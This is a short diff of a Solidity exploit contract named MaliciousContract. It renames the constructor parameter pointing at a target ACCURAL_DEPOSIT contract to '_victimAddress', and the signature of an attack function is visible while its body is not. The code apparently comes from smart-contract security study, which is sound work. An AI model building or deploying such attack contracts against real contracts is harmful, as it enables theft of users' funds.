@@ -5,8 +5,8 @@ contract MaliciousContract{
     ACCURAL_DEPOSIT accural_deposit;
     
 
-    constructor(address _accural_deposit) public{
-        accural_deposit= ACCURAL_DEPOSIT (_accural_deposit);
+    constructor(address _victimAddress) public{
+        accural_deposit= ACCURAL_DEPOSIT (_victimAddress);
     }
 
     function attack(uint amount)  public {
